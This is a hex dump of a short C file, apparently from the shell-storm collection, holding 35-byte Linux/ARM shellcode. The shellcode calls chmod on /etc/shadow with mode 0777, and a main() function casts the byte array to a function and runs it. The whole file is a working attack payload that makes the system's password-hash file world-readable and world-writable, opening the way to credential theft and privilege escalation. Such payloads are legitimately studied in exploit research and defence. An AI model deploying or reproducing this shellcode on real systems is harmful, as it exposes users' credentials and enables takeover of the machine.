00000000  2f 2a 0d 0a 20 7c 20 54  69 74 6c 65 3a 20 20 20  |/*.. | Title:   |
00000010  20 4c 69 6e 75 78 2f 41  52 4d 20 63 68 6d 6f 64  | Linux/ARM chmod|
00000020  28 22 2f 65 74 63 2f 73  68 61 64 6f 77 22 2c 20  |("/etc/shadow", |
00000030  30 37 37 37 29 20 53 68  65 6c 6c 63 6f 64 65 20  |0777) Shellcode |
00000040  33 35 20 42 79 74 65 73  0d 0a 20 7c 20 54 79 70  |35 Bytes.. | Typ|
00000050  65 3a 20 20 20 20 20 53  68 65 6c 6c 63 6f 64 65  |e:     Shellcode|
00000060  0d 0a 20 7c 20 41 75 74  68 6f 72 3a 20 20 20 46  |.. | Author:   F|
00000070  6c 6f 72 69 61 6e 20 47  61 75 6c 74 69 65 72 20  |lorian Gaultier |
00000080  3c 66 6c 6f 72 69 61 6e  2e 67 61 75 6c 74 69 65  |<florian.gaultie|
00000090  72 40 73 68 65 6c 6c 2d  73 74 6f 72 6d 2e 6f 72  |r@shell-storm.or|
000000a0  67 3e 0d 0a 20 7c 20 50  6c 61 74 66 6f 72 6d 3a  |g>.. | Platform:|
000000b0  20 4c 69 6e 75 78 20 41  52 4d 20 28 41 52 4d 39  | Linux ARM (ARM9|
000000c0  32 36 45 4a 2d 53 20 72  65 76 20 35 20 28 76 35  |26EJ-S rev 5 (v5|
000000d0  31 29 29 0d 0a 20 7c 20  5b 2b 5d 20 20 20 20 20  |1)).. | [+]     |
000000e0  20 20 68 74 74 70 3a 2f  2f 77 77 77 2e 73 68 65  |  http://www.she|
000000f0  6c 6c 2d 73 74 6f 72 6d  2e 6f 72 67 0d 0a 2a 2f  |ll-storm.org..*/|
00000100  0d 0a 0d 0a 23 69 6e 63  6c 75 64 65 20 3c 73 74  |....#include <st|
00000110  64 69 6f 2e 68 3e 0d 0a  0d 0a 0d 0a 63 68 61 72  |dio.h>......char|
00000120  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 20 3d 20 22  | shellcode[] = "|
00000130  5c 78 30 31 5c 78 36 30  5c 78 38 66 5c 78 65 32  |\x01\x60\x8f\xe2|
00000140  22 20 20 20 2f 2f 20 61  64 64 20 20 20 72 36 2c  |"   // add   r6,|
00000150  20 70 63 2c 20 23 31 0d  0a 20 20 20 20 20 20 20  | pc, #1..       |
00000160  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 31  |            "\x1|
00000170  36 5c 78 66 66 5c 78 32  66 5c 78 65 31 22 20 20  |6\xff\x2f\xe1"  |
00000180  20 2f 2f 20 62 78 20 20  20 20 72 36 0d 0a 20 20  | // bx    r6..  |
00000190  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001a0  20 22 5c 78 37 38 5c 78  34 36 22 20 20 20 20 20  | "\x78\x46"     |
000001b0  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 20 20 72  |      // mov   r|
000001c0  30 2c 20 70 63 0d 0a 20  20 20 20 20 20 20 20 20  |0, pc..         |
000001d0  20 20 20 20 20 20 20 20  20 20 22 5c 78 30 63 5c  |          "\x0c\|
000001e0  78 33 30 22 20 20 20 20  20 20 20 20 20 20 20 2f  |x30"           /|
000001f0  2f 20 61 64 64 73 20 20  72 30 2c 20 23 31 32 0d  |/ adds  r0, #12.|
00000200  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000210  20 20 20 20 22 5c 78 66  66 5c 78 32 31 22 20 20  |    "\xff\x21"  |
00000220  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 73  |         // movs|
00000230  20 20 72 31 2c 20 23 32  35 35 0d 0a 20 20 20 20  |  r1, #255..    |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |               "|
00000250  5c 78 66 66 5c 78 33 31  22 20 20 20 20 20 20 20  |\xff\x31"       |
00000260  20 20 20 20 2f 2f 20 61  64 64 73 20 20 72 31 2c  |    // adds  r1,|
00000270  20 23 32 35 35 0d 0a 20  20 20 20 20 20 20 20 20  | #255..         |
00000280  20 20 20 20 20 20 20 20  20 20 22 5c 78 30 66 5c  |          "\x0f\|
00000290  78 32 37 22 20 20 20 20  20 20 20 20 20 20 20 2f  |x27"           /|
000002a0  2f 20 6d 6f 76 73 09 20  72 37 2c 20 23 31 35 0d  |/ movs. r7, #15.|
000002b0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000002c0  20 20 20 20 22 5c 78 30  31 5c 78 64 66 22 20 20  |    "\x01\xdf"  |
000002d0  20 20 20 20 20 20 20 20  20 2f 2f 20 73 76 63 20  |         // svc |
000002e0  20 20 31 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |  1..           |
000002f0  20 20 20 20 20 20 20 20  22 5c 78 30 31 5c 78 32  |        "\x01\x2|
00000300  37 22 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |7"           // |
00000310  6d 6f 76 73 20 20 72 37  2c 20 23 31 0d 0a 20 20  |movs  r7, #1..  |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000330  20 22 5c 78 30 31 5c 78  64 66 22 20 20 20 20 20  | "\x01\xdf"     |
00000340  20 20 20 20 20 20 2f 2f  20 73 76 63 20 20 20 31  |      // svc   1|
00000350  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000360  20 20 20 20 20 22 2f 65  74 63 2f 73 68 61 64 6f  |     "/etc/shado|
00000370  77 22 3b 0d 0a 0d 0a 69  6e 74 20 6d 61 69 6e 28  |w";....int main(|
00000380  29 0d 0a 7b 0d 0a 20 20  20 20 20 20 20 20 28 2a  |)..{..        (*|
00000390  28 76 6f 69 64 28 2a 29  28 29 29 20 73 68 65 6c  |(void(*)()) shel|
000003a0  6c 63 6f 64 65 29 28 29  3b 0d 0a 0d 0a 72 65 74  |lcode)();....ret|
000003b0  75 72 6e 20 30 3b 0d 0a  7d                       |urn 0;..}|
000003b9
